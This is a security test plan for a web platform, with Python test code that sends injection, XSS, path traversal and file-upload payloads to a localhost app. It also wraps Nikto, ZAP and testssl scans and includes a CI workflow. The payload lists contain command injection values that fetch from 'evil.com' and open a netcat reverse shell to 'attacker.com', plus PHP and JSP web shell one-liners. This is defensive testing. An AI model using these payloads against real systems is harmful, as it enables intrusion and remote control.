# Security Test Plan - AI Model Validation Platform

## Overview

Security testing ensures the AI Model Validation Platform is protected against common vulnerabilities and follows security best practices. This plan covers authentication security, authorization controls, input validation, data protection, and infrastructure security.

## Security Testing Scope

### 1. Authentication Security
- JWT token security and lifecycle
- Password security and hashing
- Session management
- Multi-factor authentication (if implemented)

### 2. Authorization and Access Control
- Role-based access control (RBAC)
- Resource-level permissions
- API endpoint protection
- Cross-user data access prevention

### 3. Input Validation and Sanitization
- SQL injection prevention
- Cross-Site Scripting (XSS) protection
- Command injection prevention
- File upload security

### 4. Data Protection
- Sensitive data encryption
- Data transmission security
- Personal data handling (GDPR compliance)
- Data retention and deletion

### 5. Infrastructure Security
- HTTPS/TLS configuration
- CORS policy validation
- Rate limiting and DoS protection
- Security headers implementation

## Security Test Framework

### Security Testing Tools
```python
# tests/security/security_test_framework.py

import requests
import hashlib
import jwt
import time
import json
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
import pytest
import sqlmap
from urllib.parse import urljoin

@dataclass
class SecurityTestResult:
    """Security test result structure."""
    test_name: str
    vulnerability_type: str
    severity: str  # critical, high, medium, low
    success: bool
    details: str
    remediation: str = ""

class SecurityTester:
    """Comprehensive security testing framework."""
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.results: List[SecurityTestResult] = []
        
        # Common payloads for testing
        self.sql_injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "admin' /*",
            "' OR 1=1#",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<iframe src='javascript:alert(`XSS`)'></iframe>",
            "<details open ontoggle=alert('XSS')>"
        ]
        
        self.command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(uname -a)",
            "; wget http://evil.com/backdoor.sh",
            "& ping -c 3 127.0.0.1",
            "; curl http://malicious.com/",
            "| nc -e /bin/sh attacker.com 4444"
        ]
    
    def add_result(self, result: SecurityTestResult):
        """Add security test result."""
        self.results.append(result)
    
    def authenticate_user(self, email: str = "test@example.com", password: str = "password") -> Optional[str]:
        """Authenticate and return JWT token."""
        try:
            response = self.session.post(
                f"{self.base_url}/auth/login",
                json={"email": email, "password": password}
            )
            if response.status_code == 200:
                token = response.json().get("access_token")
                self.session.headers.update({"Authorization": f"Bearer {token}"})
                return token
            return None
        except Exception as e:
            return None
    
    def test_sql_injection_vulnerabilities(self) -> List[SecurityTestResult]:
        """Test for SQL injection vulnerabilities."""
        results = []
        
        # Test endpoints with query parameters
        test_endpoints = [
            "/api/projects?search=",
            "/api/users?email=",
            "/api/test-sessions?project_id=",
        ]
        
        for endpoint in test_endpoints:
            for payload in self.sql_injection_payloads:
                try:
                    test_url = f"{self.base_url}{endpoint}{payload}"
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check for SQL error messages or unexpected behavior
                    sql_errors = [
                        "mysql_fetch_array()",
                        "Warning: mysql_",
                        "MySQLSyntaxErrorException",
                        "valid MySQL result",
                        "PostgreSQL query failed",
                        "Warning: pg_",
                        "valid PostgreSQL result",
                        "SQLite/JDBCDriver",
                        "sqlite3.OperationalError",
                        "Microsoft OLE DB Provider",
                        "Microsoft JET Database",
                        "Oracle error",
                        "Oracle driver",
                        "quoted string not properly terminated"
                    ]
                    
                    is_vulnerable = any(error.lower() in response.text.lower() for error in sql_errors)
                    
                    if is_vulnerable:
                        results.append(SecurityTestResult(
                            test_name=f"SQL Injection - {endpoint}",
                            vulnerability_type="SQL Injection",
                            severity="critical",
                            success=False,
                            details=f"SQL injection vulnerability detected with payload: {payload}",
                            remediation="Use parameterized queries and input validation"
                        ))
                    
                except Exception as e:
                    # Connection errors might indicate successful injection
                    if "connection" in str(e).lower() or "timeout" in str(e).lower():
                        results.append(SecurityTestResult(
                            test_name=f"SQL Injection - {endpoint}",
                            vulnerability_type="SQL Injection",
                            severity="high",
                            success=False,
                            details=f"Possible SQL injection - connection disrupted with payload: {payload}",
                            remediation="Use parameterized queries and input validation"
                        ))
        
        if not results:
            results.append(SecurityTestResult(
                test_name="SQL Injection Tests",
                vulnerability_type="SQL Injection",
                severity="info",
                success=True,
                details="No SQL injection vulnerabilities detected",
                remediation=""
            ))
        
        return results
    
    def test_xss_vulnerabilities(self) -> List[SecurityTestResult]:
        """Test for Cross-Site Scripting vulnerabilities."""
        results = []
        
        # Test form inputs and parameters
        test_cases = [
            {
                "endpoint": "/api/projects",
                "method": "POST",
                "data": {"name": "<script>alert('XSS')</script>", "camera_model": "Test"}
            },
            {
                "endpoint": "/api/users/profile",
                "method": "PUT",
                "data": {"full_name": "<img src=x onerror=alert('XSS')>"}
            }
        ]
        
        for test_case in test_cases:
            for payload in self.xss_payloads:
                try:
                    # Inject XSS payload into data
                    test_data = test_case["data"].copy()
                    for key in test_data:
                        if isinstance(test_data[key], str):
                            test_data[key] = payload
                    
                    if test_case["method"] == "POST":
                        response = self.session.post(
                            f"{self.base_url}{test_case['endpoint']}",
                            json=test_data,
                            timeout=10
                        )
                    elif test_case["method"] == "PUT":
                        response = self.session.put(
                            f"{self.base_url}{test_case['endpoint']}",
                            json=test_data,
                            timeout=10
                        )
                    
                    # Check if payload is reflected in response without encoding
                    if payload in response.text and response.headers.get('content-type', '').startswith('text/html'):
                        results.append(SecurityTestResult(
                            test_name=f"XSS - {test_case['endpoint']}",
                            vulnerability_type="Cross-Site Scripting",
                            severity="high",
                            success=False,
                            details=f"XSS vulnerability detected - payload reflected: {payload}",
                            remediation="Implement proper input sanitization and output encoding"
                        ))
                
                except Exception as e:
                    pass  # Continue with other tests
        
        if not results:
            results.append(SecurityTestResult(
                test_name="XSS Tests",
                vulnerability_type="Cross-Site Scripting",
                severity="info",
                success=True,
                details="No XSS vulnerabilities detected",
                remediation=""
            ))
        
        return results
    
    def test_authentication_security(self) -> List[SecurityTestResult]:
        """Test authentication security."""
        results = []
        
        # Test 1: Weak password acceptance
        weak_passwords = ["123", "password", "admin", "test", "123456", "qwerty"]
        
        for weak_password in weak_passwords:
            try:
                response = self.session.post(
                    f"{self.base_url}/auth/register",
                    json={
                        "email": f"weak{int(time.time())}@test.com",
                        "password": weak_password,
                        "full_name": "Test User"
                    }
                )
                
                if response.status_code == 201:  # User created successfully
                    results.append(SecurityTestResult(
                        test_name="Weak Password Policy",
                        vulnerability_type="Authentication",
                        severity="medium",
                        success=False,
                        details=f"Weak password accepted: {weak_password}",
                        remediation="Implement strong password policy with complexity requirements"
                    ))
                    break  # Only report once
            
            except Exception as e:
                pass
        
        # Test 2: JWT token tampering
        token = self.authenticate_user()
        if token:
            try:
                # Decode JWT to get payload
                decoded = jwt.decode(token, options={"verify_signature": False})
                
                # Tamper with token (change user ID)
                decoded["sub"] = "malicious_user_id"
                
                # Create new token with same secret (this should fail)
                tampered_token = jwt.encode(decoded, "wrong_secret", algorithm="HS256")
                
                # Test with tampered token
                test_session = requests.Session()
                test_session.headers.update({"Authorization": f"Bearer {tampered_token}"})
                
                response = test_session.get(f"{self.base_url}/api/projects")
                
                if response.status_code == 200:
                    results.append(SecurityTestResult(
                        test_name="JWT Token Tampering",
                        vulnerability_type="Authentication",
                        severity="critical",
                        success=False,
                        details="Tampered JWT token accepted",
                        remediation="Ensure proper JWT signature verification"
                    ))
            
            except jwt.InvalidTokenError:
                # This is expected - token should be rejected
                pass
        
        # Test 3: Token expiration
        if token:
            # Decode token to check expiration
            try:
                decoded = jwt.decode(token, options={"verify_signature": False})
                exp_time = decoded.get("exp", 0)
                current_time = time.time()
                
                if exp_time - current_time > 86400:  # Token expires in more than 24 hours
                    results.append(SecurityTestResult(
                        test_name="JWT Token Expiration",
                        vulnerability_type="Authentication",
                        severity="medium",
                        success=False,
                        details=f"JWT token has long expiration time: {(exp_time - current_time) / 3600:.1f} hours",
                        remediation="Use shorter token expiration times (< 1 hour) and implement refresh tokens"
                    ))
            
            except jwt.InvalidTokenError:
                pass
        
        # Test 4: Brute force protection
        # Attempt multiple failed logins
        failed_attempts = 0
        for attempt in range(10):
            response = self.session.post(
                f"{self.base_url}/auth/login",
                json={"email": "test@example.com", "password": f"wrong_password_{attempt}"}
            )
            
            if response.status_code == 401:
                failed_attempts += 1
            elif response.status_code == 429:  # Rate limited
                break
        
        if failed_attempts >= 10:
            results.append(SecurityTestResult(
                test_name="Brute Force Protection",
                vulnerability_type="Authentication",
                severity="medium",
                success=False,
                details="No rate limiting detected after 10 failed login attempts",
                remediation="Implement account lockout and rate limiting for failed login attempts"
            ))
        
        return results
    
    def test_authorization_controls(self) -> List[SecurityTestResult]:
        """Test authorization and access control."""
        results = []
        
        # Test 1: Access other user's resources
        # Create two users
        user1_token = self.authenticate_user("user1@test.com", "password1")
        user2_token = self.authenticate_user("user2@test.com", "password2")
        
        if user1_token and user2_token:
            # User 1 creates a project
            self.session.headers.update({"Authorization": f"Bearer {user1_token}"})
            response = self.session.post(
                f"{self.base_url}/api/projects",
                json={
                    "name": "User 1 Project",
                    "camera_model": "Test Camera",
                    "camera_view": "Front-facing VRU",
                    "signal_type": "GPIO"
                }
            )
            
            if response.status_code == 201:
                project_id = response.json().get("id")
                
                # User 2 tries to access User 1's project
                self.session.headers.update({"Authorization": f"Bearer {user2_token}"})
                response = self.session.get(f"{self.base_url}/api/projects/{project_id}")
                
                if response.status_code == 200:
                    results.append(SecurityTestResult(
                        test_name="Unauthorized Resource Access",
                        vulnerability_type="Authorization",
                        severity="critical",
                        success=False,
                        details="User can access another user's project",
                        remediation="Implement proper authorization checks for resource access"
                    ))
        
        # Test 2: API endpoint access without authentication
        unauthenticated_session = requests.Session()
        protected_endpoints = [
            "/api/projects",
            "/api/test-sessions",
            "/api/users/profile"
        ]
        
        for endpoint in protected_endpoints:
            response = unauthenticated_session.get(f"{self.base_url}{endpoint}")
            
            if response.status_code == 200:
                results.append(SecurityTestResult(
                    test_name=f"Unauthenticated Access - {endpoint}",
                    vulnerability_type="Authorization",
                    severity="high",
                    success=False,
                    details=f"Protected endpoint accessible without authentication: {endpoint}",
                    remediation="Ensure all protected endpoints require authentication"
                ))
        
        return results
    
    def test_file_upload_security(self) -> List[SecurityTestResult]:
        """Test file upload security."""
        results = []
        
        # Test 1: Malicious file upload
        malicious_files = [
            {
                "filename": "malicious.php",
                "content": b"<?php system($_GET['cmd']); ?>",
                "content_type": "application/x-php"
            },
            {
                "filename": "malicious.jsp",
                "content": b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
                "content_type": "application/x-jsp"
            },
            {
                "filename": "test.exe",
                "content": b"MZ\x90\x00",  # PE header
                "content_type": "application/x-executable"
            }
        ]
        
        for malicious_file in malicious_files:
            try:
                files = {
                    "file": (
                        malicious_file["filename"],
                        malicious_file["content"],
                        malicious_file["content_type"]
                    )
                }
                
                response = self.session.post(
                    f"{self.base_url}/api/projects/test-project-id/videos",
                    files=files
                )
                
                if response.status_code == 200:
                    results.append(SecurityTestResult(
                        test_name=f"Malicious File Upload - {malicious_file['filename']}",
                        vulnerability_type="File Upload",
                        severity="high",
                        success=False,
                        details=f"Malicious file uploaded successfully: {malicious_file['filename']}",
                        remediation="Implement file type validation, size limits, and virus scanning"
                    ))
            
            except Exception as e:
                pass
        
        # Test 2: Large file upload (DoS)
        try:
            large_content = b"A" * (100 * 1024 * 1024)  # 100MB
            files = {"file": ("large_file.mp4", large_content, "video/mp4")}
            
            response = self.session.post(
                f"{self.base_url}/api/projects/test-project-id/videos",
                files=files,
                timeout=30
            )
            
            if response.status_code == 200:
                results.append(SecurityTestResult(
                    test_name="Large File Upload DoS",
                    vulnerability_type="File Upload",
                    severity="medium",
                    success=False,
                    details="Large file (100MB) uploaded without size limit enforcement",
                    remediation="Implement file size limits and upload quotas"
                ))
        
        except Exception as e:
            # Timeout or error is expected for large files
            pass
        
        return results
    
    def test_information_disclosure(self) -> List[SecurityTestResult]:
        """Test for information disclosure vulnerabilities."""
        results = []
        
        # Test 1: Error message disclosure
        error_inducing_requests = [
            {"url": "/api/projects/non-existent-id", "method": "GET"},
            {"url": "/api/users/12345", "method": "GET"},
            {"url": "/api/invalid-endpoint", "method": "GET"}
        ]
        
        for request in error_inducing_requests:
            try:
                response = self.session.request(
                    request["method"],
                    f"{self.base_url}{request['url']}"
                )
                
                # Check for sensitive information in error messages
                sensitive_info = [
                    "traceback",
                    "stack trace",
                    "database",
                    "connection string",
                    "password",
                    "secret",
                    "internal server error",
                    "debug",
                    "/usr/",
                    "/etc/",
                    "C:\\"
                ]
                
                for info in sensitive_info:
                    if info.lower() in response.text.lower():
                        results.append(SecurityTestResult(
                            test_name="Information Disclosure in Error Messages",
                            vulnerability_type="Information Disclosure",
                            severity="medium",
                            success=False,
                            details=f"Sensitive information disclosed in error: {info}",
                            remediation="Implement generic error messages and proper logging"
                        ))
                        break
            
            except Exception as e:
                pass
        
        # Test 2: Directory traversal
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd"
        ]
        
        for payload in traversal_payloads:
            try:
                response = self.session.get(
                    f"{self.base_url}/api/files/{payload}"
                )
                
                if "root:" in response.text or "[drivers]" in response.text:
                    results.append(SecurityTestResult(
                        test_name="Directory Traversal",
                        vulnerability_type="Information Disclosure",
                        severity="high",
                        success=False,
                        details=f"Directory traversal successful with payload: {payload}",
                        remediation="Implement proper file path validation and sanitization"
                    ))
            
            except Exception as e:
                pass
        
        return results
    
    def test_security_headers(self) -> List[SecurityTestResult]:
        """Test security headers implementation."""
        results = []
        
        response = self.session.get(f"{self.base_url}/")
        headers = response.headers
        
        # Required security headers
        required_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": ["DENY", "SAMEORIGIN"],
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": None,  # Should exist
            "Content-Security-Policy": None,  # Should exist
            "Referrer-Policy": ["no-referrer", "strict-origin-when-cross-origin"]
        }
        
        for header_name, expected_values in required_headers.items():
            header_value = headers.get(header_name)
            
            if not header_value:
                results.append(SecurityTestResult(
                    test_name=f"Missing Security Header - {header_name}",
                    vulnerability_type="Security Headers",
                    severity="medium",
                    success=False,
                    details=f"Security header not present: {header_name}",
                    remediation=f"Implement {header_name} header"
                ))
            elif expected_values and header_value not in expected_values:
                results.append(SecurityTestResult(
                    test_name=f"Incorrect Security Header - {header_name}",
                    vulnerability_type="Security Headers",
                    severity="low",
                    success=False,
                    details=f"Header {header_name} has unexpected value: {header_value}",
                    remediation=f"Set correct value for {header_name} header"
                ))
        
        return results
    
    def generate_security_report(self) -> str:
        """Generate comprehensive security report."""
        # Run all security tests
        all_results = []
        all_results.extend(self.test_sql_injection_vulnerabilities())
        all_results.extend(self.test_xss_vulnerabilities())
        all_results.extend(self.test_authentication_security())
        all_results.extend(self.test_authorization_controls())
        all_results.extend(self.test_file_upload_security())
        all_results.extend(self.test_information_disclosure())
        all_results.extend(self.test_security_headers())
        
        # Count results by severity
        severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        vulnerabilities = []
        
        for result in all_results:
            severity_counts[result.severity] += 1
            if not result.success:
                vulnerabilities.append(result)
        
        # Generate report
        report_lines = []
        report_lines.append("# Security Test Report")
        report_lines.append(f"Generated at: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        report_lines.append("")
        
        # Summary
        report_lines.append("## Summary")
        report_lines.append(f"Total Tests Run: {len(all_results)}")
        report_lines.append(f"Vulnerabilities Found: {len(vulnerabilities)}")
        report_lines.append("")
        
        # Severity breakdown
        report_lines.append("### Severity Breakdown")
        for severity, count in severity_counts.items():
            if count > 0:
                report_lines.append(f"- {severity.capitalize()}: {count}")
        report_lines.append("")
        
        # Detailed vulnerabilities
        if vulnerabilities:
            report_lines.append("## Vulnerabilities Found")
            
            for vulnerability in sorted(vulnerabilities, key=lambda x: ["critical", "high", "medium", "low"].index(x.severity)):
                report_lines.append(f"### [{vulnerability.severity.upper()}] {vulnerability.test_name}")
                report_lines.append(f"**Type:** {vulnerability.vulnerability_type}")
                report_lines.append(f"**Details:** {vulnerability.details}")
                if vulnerability.remediation:
                    report_lines.append(f"**Remediation:** {vulnerability.remediation}")
                report_lines.append("")
        else:
            report_lines.append("## No Vulnerabilities Found")
            report_lines.append("All security tests passed successfully.")
        
        return "\n".join(report_lines)
```

### Security Test Implementation

```python
# tests/security/test_authentication_security.py

import pytest
import time
import jwt
from security_test_framework import SecurityTester

@pytest.mark.security
class TestAuthenticationSecurity:
    """Authentication security test cases."""
    
    def setup_method(self):
        """Setup security tester."""
        self.security_tester = SecurityTester()
    
    def test_password_security_requirements(self):
        """Test password policy enforcement."""
        # Test weak passwords
        weak_passwords = [
            "123",
            "password",
            "admin",
            "test",
            "123456789",
            "qwerty",
            "abc",
            ""
        ]
        
        for weak_password in weak_passwords:
            response = self.security_tester.session.post(
                f"{self.security_tester.base_url}/auth/register",
                json={
                    "email": f"weak{int(time.time())}@test.com",
                    "password": weak_password,
                    "full_name": "Test User"
                }
            )
            
            # Should reject weak passwords
            assert response.status_code in [400, 422], f"Weak password accepted: {weak_password}"
    
    def test_jwt_token_security(self):
        """Test JWT token security implementation."""
        token = self.security_tester.authenticate_user()
        assert token is not None, "Authentication failed"
        
        # Test 1: Token structure validation
        try:
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
            
            # Check algorithm
            assert header.get("alg") in ["HS256", "RS256"], "Weak or missing JWT algorithm"
            
            # Check required claims
            required_claims = ["sub", "exp", "iat"]
            for claim in required_claims:
                assert claim in payload, f"Missing required JWT claim: {claim}"
            
            # Check expiration time (should be reasonable)
            exp_time = payload.get("exp", 0)
            current_time = time.time()
            token_lifetime = exp_time - current_time
            
            assert token_lifetime > 0, "JWT token is already expired"
            assert token_lifetime < 86400, "JWT token lifetime too long (>24 hours)"
            
        except jwt.InvalidTokenError as e:
            pytest.fail(f"Invalid JWT token structure: {e}")
    
    def test_session_management(self):
        """Test session management security."""
        token = self.security_tester.authenticate_user()
        
        # Test concurrent sessions
        session1 = self.security_tester.session
        session2 = requests.Session()
        session2.headers.update({"Authorization": f"Bearer {token}"})
        
        # Both sessions should work initially
        response1 = session1.get(f"{self.security_tester.base_url}/api/projects")
        response2 = session2.get(f"{self.security_tester.base_url}/api/projects")
        
        assert response1.status_code == 200
        assert response2.status_code == 200
        
        # Test logout/token invalidation
        logout_response = session1.post(f"{self.security_tester.base_url}/auth/logout")
        
        if logout_response.status_code == 200:
            # After logout, token should be invalid
            response_after_logout = session1.get(f"{self.security_tester.base_url}/api/projects")
            assert response_after_logout.status_code == 401, "Token not invalidated after logout"
    
    def test_brute_force_protection(self):
        """Test brute force attack protection."""
        # Attempt multiple failed logins
        failed_login_count = 0
        rate_limited = False
        
        for attempt in range(15):
            response = self.security_tester.session.post(
                f"{self.security_tester.base_url}/auth/login",
                json={
                    "email": "nonexistent@example.com",
                    "password": f"wrong_password_{attempt}"
                }
            )
            
            if response.status_code == 429:  # Too Many Requests
                rate_limited = True
                break
            elif response.status_code == 401:
                failed_login_count += 1
        
        # Should have rate limiting after multiple failed attempts
        assert rate_limited or failed_login_count < 10, "No brute force protection detected"

@pytest.mark.security
class TestAuthorizationSecurity:
    """Authorization and access control security tests."""
    
    def setup_method(self):
        """Setup security tester."""
        self.security_tester = SecurityTester()
    
    def test_horizontal_privilege_escalation(self):
        """Test for horizontal privilege escalation vulnerabilities."""
        # Create two users
        user1_response = self.security_tester.session.post(
            f"{self.security_tester.base_url}/auth/register",
            json={
                "email": f"user1_{int(time.time())}@test.com",
                "password": "SecurePassword123!",
                "full_name": "User 1"
            }
        )
        
        user2_response = self.security_tester.session.post(
            f"{self.security_tester.base_url}/auth/register",
            json={
                "email": f"user2_{int(time.time())}@test.com",
                "password": "SecurePassword123!",
                "full_name": "User 2"
            }
        )
        
        assert user1_response.status_code == 201
        assert user2_response.status_code == 201
        
        # User 1 creates a project
        user1_token = self.security_tester.authenticate_user(
            user1_response.json()["email"], "SecurePassword123!"
        )
        
        project_response = self.security_tester.session.post(
            f"{self.security_tester.base_url}/api/projects",
            json={
                "name": "User 1 Private Project",
                "camera_model": "Test Camera",
                "camera_view": "Front-facing VRU",
                "signal_type": "GPIO"
            }
        )
        
        assert project_response.status_code == 201
        project_id = project_response.json()["id"]
        
        # User 2 attempts to access User 1's project
        user2_token = self.security_tester.authenticate_user(
            user2_response.json()["email"], "SecurePassword123!"
        )
        
        unauthorized_access = self.security_tester.session.get(
            f"{self.security_tester.base_url}/api/projects/{project_id}"
        )
        
        # Should be forbidden
        assert unauthorized_access.status_code in [403, 404], "Horizontal privilege escalation vulnerability"
    
    def test_vertical_privilege_escalation(self):
        """Test for vertical privilege escalation vulnerabilities."""
        # Test accessing admin endpoints as regular user
        token = self.security_tester.authenticate_user()
        
        admin_endpoints = [
            "/api/admin/users",
            "/api/admin/system-stats",
            "/api/admin/logs"
        ]
        
        for endpoint in admin_endpoints:
            response = self.security_tester.session.get(
                f"{self.security_tester.base_url}{endpoint}"
            )
            
            # Should be forbidden for regular users
            assert response.status_code in [401, 403, 404], f"Possible privilege escalation at {endpoint}"
    
    def test_insecure_direct_object_references(self):
        """Test for insecure direct object reference vulnerabilities."""
        token = self.security_tester.authenticate_user()
        
        # Try to access objects with predictable IDs
        test_ids = [1, 2, 3, "1", "2", "3", "admin", "test"]
        
        for test_id in test_ids:
            endpoints = [
                f"/api/users/{test_id}",
                f"/api/projects/{test_id}",
                f"/api/test-sessions/{test_id}"
            ]
            
            for endpoint in endpoints:
                response = self.security_tester.session.get(
                    f"{self.security_tester.base_url}{endpoint}"
                )
                
                # Should not expose other users' data
                if response.status_code == 200:
                    data = response.json()
                    # Additional checks to ensure it's the authenticated user's data
                    if "email" in data:
                        assert data["email"] == "test@example.com", f"IDOR vulnerability at {endpoint}"
```

### Automated Security Scanning

```python
# tests/security/automated_security_scan.py

import subprocess
import json
import time
from typing import Dict, List, Any
import requests

class AutomatedSecurityScanner:
    """Automated security scanning with external tools."""
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.results = {}
    
    def run_nikto_scan(self) -> Dict[str, Any]:
        """Run Nikto web vulnerability scanner."""
        try:
            # Run Nikto scan
            cmd = [
                "nikto",
                "-h", self.base_url,
                "-Format", "json",
                "-output", "nikto_results.json"
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                with open("nikto_results.json", "r") as f:
                    nikto_results = json.load(f)
                return {"status": "success", "results": nikto_results}
            else:
                return {"status": "error", "error": result.stderr}
                
        except subprocess.TimeoutExpired:
            return {"status": "timeout", "error": "Nikto scan timed out"}
        except FileNotFoundError:
            return {"status": "not_available", "error": "Nikto not installed"}
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    def run_zap_scan(self) -> Dict[str, Any]:
        """Run OWASP ZAP security scan."""
        try:
            # Start ZAP daemon
            zap_start = subprocess.run([
                "zap.sh", "-daemon", "-port", "8080", "-config", "api.disablekey=true"
            ], capture_output=True, timeout=30)
            
            time.sleep(10)  # Wait for ZAP to start
            
            # Run spider scan
            spider_response = requests.get(
                f"http://localhost:8080/JSON/spider/action/scan/",
                params={"url": self.base_url}
            )
            
            scan_id = spider_response.json()["scan"]
            
            # Wait for spider to complete
            while True:
                status_response = requests.get(
                    f"http://localhost:8080/JSON/spider/view/status/",
                    params={"scanId": scan_id}
                )
                
                if status_response.json()["status"] == "100":
                    break
                
                time.sleep(5)
            
            # Run active scan
            active_response = requests.get(
                f"http://localhost:8080/JSON/ascan/action/scan/",
                params={"url": self.base_url}
            )
            
            active_scan_id = active_response.json()["scan"]
            
            # Wait for active scan to complete (or timeout)
            timeout_counter = 0
            while timeout_counter < 60:  # 5 minute timeout
                status_response = requests.get(
                    f"http://localhost:8080/JSON/ascan/view/status/",
                    params={"scanId": active_scan_id}
                )
                
                if status_response.json()["status"] == "100":
                    break
                
                time.sleep(5)
                timeout_counter += 1
            
            # Get results
            alerts_response = requests.get(
                f"http://localhost:8080/JSON/core/view/alerts/"
            )
            
            # Stop ZAP
            requests.get("http://localhost:8080/JSON/core/action/shutdown/")
            
            return {"status": "success", "results": alerts_response.json()}
            
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    def run_ssl_scan(self) -> Dict[str, Any]:
        """Run SSL/TLS security scan using testssl.sh."""
        try:
            cmd = [
                "testssl.sh",
                "--jsonfile", "ssl_results.json",
                "--quiet",
                self.base_url.replace("http://", "https://")
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                with open("ssl_results.json", "r") as f:
                    ssl_results = json.load(f)
                return {"status": "success", "results": ssl_results}
            else:
                return {"status": "error", "error": result.stderr}
                
        except subprocess.TimeoutExpired:
            return {"status": "timeout", "error": "SSL scan timed out"}
        except FileNotFoundError:
            return {"status": "not_available", "error": "testssl.sh not installed"}
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    def run_dependency_scan(self) -> Dict[str, Any]:
        """Run dependency vulnerability scan using safety."""
        try:
            # Scan Python dependencies
            cmd = ["safety", "check", "--json"]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                return {"status": "success", "vulnerabilities": []}
            else:
                # Parse safety output for vulnerabilities
                try:
                    vulnerabilities = json.loads(result.stdout)
                    return {"status": "vulnerabilities_found", "vulnerabilities": vulnerabilities}
                except json.JSONDecodeError:
                    return {"status": "error", "error": "Could not parse safety output"}
                    
        except subprocess.TimeoutExpired:
            return {"status": "timeout", "error": "Dependency scan timed out"}
        except FileNotFoundError:
            return {"status": "not_available", "error": "Safety not installed"}
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    def generate_comprehensive_report(self) -> str:
        """Generate comprehensive security report from all scans."""
        report_lines = []
        report_lines.append("# Comprehensive Security Scan Report")
        report_lines.append(f"Target: {self.base_url}")
        report_lines.append(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        report_lines.append("")
        
        # Run all scans
        scans = {
            "Nikto Vulnerability Scan": self.run_nikto_scan(),
            "OWASP ZAP Scan": self.run_zap_scan(),
            "SSL/TLS Configuration": self.run_ssl_scan(),
            "Dependency Vulnerabilities": self.run_dependency_scan()
        }
        
        for scan_name, scan_result in scans.items():
            report_lines.append(f"## {scan_name}")
            
            if scan_result["status"] == "success":
                report_lines.append("✅ Scan completed successfully")
                
                if "results" in scan_result and scan_result["results"]:
                    # Process scan-specific results
                    if scan_name == "OWASP ZAP Scan":
                        alerts = scan_result["results"].get("alerts", [])
                        if alerts:
                            report_lines.append(f"Found {len(alerts)} security alerts:")
                            for alert in alerts[:10]:  # Show first 10
                                report_lines.append(f"- {alert.get('name', 'Unknown')} (Risk: {alert.get('risk', 'Unknown')})")
                        else:
                            report_lines.append("No security alerts found")
                    
                elif "vulnerabilities" in scan_result:
                    vulns = scan_result["vulnerabilities"]
                    if vulns:
                        report_lines.append(f"Found {len(vulns)} dependency vulnerabilities:")
                        for vuln in vulns[:5]:  # Show first 5
                            report_lines.append(f"- {vuln.get('package', 'Unknown')} {vuln.get('version', '')}")
                    else:
                        report_lines.append("No dependency vulnerabilities found")
                
            elif scan_result["status"] == "not_available":
                report_lines.append("⚠️ Scanner not available - install required tools")
                
            elif scan_result["status"] == "error":
                report_lines.append(f"❌ Scan failed: {scan_result.get('error', 'Unknown error')}")
                
            elif scan_result["status"] == "timeout":
                report_lines.append("⏱️ Scan timed out")
            
            report_lines.append("")
        
        return "\n".join(report_lines)

@pytest.mark.security
@pytest.mark.slow
def test_automated_security_scan():
    """Run automated security scan."""
    scanner = AutomatedSecurityScanner()
    report = scanner.generate_comprehensive_report()
    
    # Save report
    with open("security_scan_report.md", "w") as f:
        f.write(report)
    
    print("Security scan report generated: security_scan_report.md")
    
    # Basic assertions
    assert "# Comprehensive Security Scan Report" in report
    assert len(report) > 1000  # Report should be substantial
```

## Security Testing CI/CD Integration

### GitHub Actions Security Workflow
```yaml
# .github/workflows/security.yml

name: Security Testing

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 2 * * 1'  # Weekly scan every Monday at 2 AM

jobs:
  security-tests:
    runs-on: ubuntu-latest
    
    services:
      postgres:
        image: postgres:14
        env:
          POSTGRES_PASSWORD: test
          POSTGRES_USER: test
          POSTGRES_DB: security_test_db
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports:
          - 5432:5432
    
    steps:
      - uses: actions/checkout@v3
      
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'
      
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install -r requirements-security.txt
          pip install safety bandit semgrep
      
      - name: Start application
        run: |
          uvicorn main:app --host 0.0.0.0 --port 8000 &
          sleep 10
        env:
          DATABASE_URL: postgresql://test:test@localhost:5432/security_test_db
      
      - name: Run security tests
        run: |
          pytest tests/security/ -v --junitxml=security-results.xml
        env:
          TEST_ENV: security
      
      - name: Run static security analysis
        run: |
          # Bandit for Python security issues
          bandit -r . -f json -o bandit-report.json || true
          
          # Semgrep for additional security patterns
          semgrep --config=auto --json --output=semgrep-report.json . || true
          
          # Safety for dependency vulnerabilities
          safety check --json --output safety-report.json || true
      
